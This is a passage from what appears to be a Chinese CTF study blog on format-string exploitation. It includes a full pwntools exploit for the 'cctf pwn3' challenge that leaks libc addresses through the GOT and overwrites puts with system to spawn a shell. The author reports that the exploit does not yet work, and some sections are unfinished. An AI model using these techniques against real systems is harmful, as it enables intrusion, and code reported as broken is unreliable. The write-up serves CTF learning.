fp-&gt;_IO_read_end;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (delta != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> TODO</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (_IO_in_backup (fp))</span><br><span class=\"line\">\tdelta -= eGptr () - Gbase ();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (new_pos != (_IO_off64_t) EOF)</span><br><span class=\"line\">\tfp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> ESPIPE</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (errno == ESPIPE)</span><br><span class=\"line\">\t; <span class=\"comment\">/* Ignore error from unseekable devices. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tretval = EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (retval != EOF)</span><br><span class=\"line\">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">  <span class=\"comment\">/* <span class=\"doctag\">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class=\"line\">  <span class=\"comment\">/*    setg(base(), ptr, ptr); */</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> retval;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure>\n\n<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>\n<h5 id=\"pwntools与缓冲区机制\"><a href=\"#pwntools与缓冲区机制\" class=\"headerlink\" title=\"pwntools与缓冲区机制\"></a>pwntools与缓冲区机制</h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>\n<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/\">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>\n<h4 id=\"ms？\"><a href=\"#ms？\" class=\"headerlink\" title=\"%ms？\"></a>%ms？</h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>\n<p><code>__isoc99_scanf(&quot;%ms&quot;, &amp;format);</code></p>\n<p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>\n<p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>\n<p>那么如何打印这个flag呢？</p>\n<p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png\" alt=\"截屏2021-10-26 下午10.31.45\"></p>\n<p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>\n<p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png\" alt=\"截屏2021-10-26 下午10.35.39\"></p>\n<p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>\n<p>利用%n$s打印参数，即可获得flag。</p>\n<h2 id=\"2）cctf-pwn3\"><a href=\"#2）cctf-pwn3\" class=\"headerlink\" title=\"2）cctf pwn3\"></a>2）cctf pwn3</h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>\n<p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>\n<p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>\n<ol>\n<li>知道需要修改的函数的真实地址。</li>\n<li>需要想办法改写函数的got表。</li>\n</ol>\n<p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>\n<p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"程序分析\"><a href=\"#程序分析\" class=\"headerlink\" title=\"程序分析\"></a>程序分析</h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png\" alt=\"截屏2021-10-27 上午8.50.03\"></p>\n<p>还是先进行一个简单的逻辑分析。</p>\n<p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png\" alt=\"截屏2021-10-27 上午9.02.34\"></p>\n<p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>\n<p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址，通过地址确定libc基址，再修改函数got表位systen的地址从而getshell，这也是一般的格式化字符串的板子题常见套路。</p>\n<p>ps:用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>\n<p>原因详见<a href=\"https://fuurinko.github.io/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/%E7%9A%842.1%E8%8A%82%E3%80%82\">https://fuurinko.github.io/2021/10/27/gdb附加调试的一些黑魔法/的2.1节。</a></p>\n<h4 id=\"绕过密码检测\"><a href=\"#绕过密码检测\" class=\"headerlink\" title=\"绕过密码检测\"></a>绕过密码检测</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#ask_username.c </span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">39</span> &amp;&amp; src[i]; ++i )</span><br><span class=\"line\">   ++src[i];</span><br><span class=\"line\"> <span class=\"comment\">#ask_password.c</span></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( strcmp(s1, <span class=\"string\">&quot;sysbdmin&quot;</span>) )</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   puts(<span class=\"string\">&quot;who you are?&quot;</span>);</span><br><span class=\"line\">   exit(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>进入程序会有一个比较简单的小check，我们所输入的用户名的ascii需要小于<code>sysbdmin</code>,可以直接用符合条件的username来绕过检测。(strcmp是以ascii码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的ascii小，但字符长度相等的字符。)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#rxraclhm</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"寻找格式化字符串在栈中的偏移\"><a href=\"#寻找格式化字符串在栈中的偏移\" class=\"headerlink\" title=\"寻找格式化字符串在栈中的偏移\"></a>寻找格式化字符串在栈中的偏移</h4><p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>\n<p>打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>\n<p>ps：关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>\n<p>原理参见：<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.01.05.png\" alt=\"截屏2022-03-22 上午11.01.05\"></p>\n<p>​        可以看到我们输入的格式化字符串的地址位于第八个参数。</p>\n<h4 id=\"利用漏洞泄露地址\"><a href=\"#利用漏洞泄露地址\" class=\"headerlink\" title=\"利用漏洞泄露地址\"></a>利用漏洞泄露地址</h4><p>​        既然找到了格式化字符串的偏移，那么就可以利用它来泄露内存了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># get the addr of puts</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts got : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_got))</span><br><span class=\"line\">put(<span class=\"string\">b&#x27;aa&#x27;</span>, <span class=\"string\">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class=\"line\">puts_addr = u32(get(<span class=\"string\">&#x27;1111&#x27;</span>)[:<span class=\"number\">4</span>])</span><br></pre></td></tr></table></figure>\n\n\n\n<p>put一个名为aa的文件，内容是格式化字符串以及puts的got表地址。</p>\n<p>这里<code>%8$s + p32(puts_got)</code>先把puts的got表传进去，然后再通过%8$s打印。</p>\n<p>然后接收信息，就是puts的got表地址。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.13.31.png\" alt=\"截屏2022-03-22 上午11.13.31\"></p>\n<h4 id=\"利用格式化字符串覆盖puts的got表\"><a href=\"#利用格式化字符串覆盖puts的got表\" class=\"headerlink\" title=\"利用格式化字符串覆盖puts的got表\"></a>利用格式化字符串覆盖puts的got表</h4><h5 id=\"fmt模块实现\"><a href=\"#fmt模块实现\" class=\"headerlink\" title=\"fmt模块实现\"></a>fmt模块实现</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class=\"line\">put(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;ftp&gt;&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br></pre></td></tr></table></figure>\n\n<p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>\n<p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>\n<p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">格式化字符串偏移计算原理</a></p>\n<h5 id=\"手动实现\"><a href=\"#手动实现\" class=\"headerlink\" title=\"手动实现\"></a>手动实现</h5><p>​        等等再写。</p>\n<p>​        </p>\n<h4 id=\"调用show，实现getshell\"><a href=\"#调用show，实现getshell\" class=\"headerlink\" title=\"调用show，实现getshell\"></a>调用show，实现getshell</h4><p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>\n<p>   <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8A%E5%8D%8811.33.03.png\" alt=\"截屏2022-03-22 上午11.33.03\"></p>\n<p>可以看到确实puts的got表被改为了system的地址。</p>\n<p>但是感觉情况与我期待的并不一样，当调用<code>fmt_payload</code>module的时候，puts的got表并没有被修改，而是在最后show（）的时候才突然变成了system。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%883.54.02.png\" alt=\"截屏2022-03-22 下午3.54.02\"></p>\n<p>​        发现问题所在了。system的地址根本不是system。。真的逆天，这个确实不知道该怎么办了，got表也改了，函数参数也传入了，但是地址不对。。。为什么。</p>\n<h4 id=\"完整exp：\"><a href=\"#完整exp：\" class=\"headerlink\" title=\"完整exp：\"></a>完整exp：</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn3&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span>(<span class=\"params\">name</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    data = p.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">name, content</span>):</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;put&#x27;</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;please enter the name of the file you want to upload:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(name)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;then, enter the content:&#x27;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;dir&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;rxraclhm&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get the addr of puts</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts got : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_got))</span><br><span class=\"line\">put(<span class=\"string\">b&#x27;aa&#x27;</span>, <span class=\"string\">b&#x27;%8$s&#x27;</span> + p32(puts_got))</span><br><span class=\"line\">puts_addr = u32(get(<span class=\"string\">&#x27;aa&#x27;</span>)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;puts_addr : &#x27;</span> + <span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">system_off = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts_off = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_base = puts_addr - puts_off</span><br><span class=\"line\">system_addr = libc_base + system_off</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;system addr : &#x27;</span> + <span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class=\"line\">put(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>, payload)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;ftp&gt;&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;get&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;enter the file name you want to get:&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/sh;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"echo2\"><a href=\"#echo2\" class=\"headerlink\" title=\"echo2\"></a>echo2</h3><h4 id=\"overview\"><a href=\"#overview\" class=\"headerlink\" title=\"overview\"></a>overview</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-22%20%E4%B8%8B%E5%8D%884.27.16.png\" alt=\"截屏2022-03-22 下午4.27.16\"></p>\n<h4 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h4><p>​        没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  fgets(s, <span class=\"number\">256</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ( <span class=\"built_in\">strcmp</span>(s, <span class=\"string\">&quot;exit\\n&quot;</span>) );</span><br><span class=\"line\">system(<span class=\"string\">&quot;echo Goodbye&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>​        </p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>\n<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://zhuanlan.zhihu.com/p/79504011\">缓冲区机制详解</a></p>\n<p><a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p><a href=\"https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf\">difference between %ms and %s scanf</a></p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/\">格式化字符串</a></p>\n<p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>\n<p><a href=\"https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr\"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>\n<p><a href=\"https://blog.csdn.net/weixin_43092232/article/details/105647076\">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>\n<p><a href=\"https://blog.csdn.net/qq_33976344/article/details/113503914\">pwntools中fmtstr的使用</a></p>\n<p><a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\">3.1.1 格式化字符串漏洞</a></p>\n<p><a href=\"https://blog.csdn.net/CLHugh/article/details/75000104\">Python中self用法详解</a></p>\n</li>\n</ul>\n<p>​    </p>\n","categories":["STACK - Format"],"tags":["FMT"]}]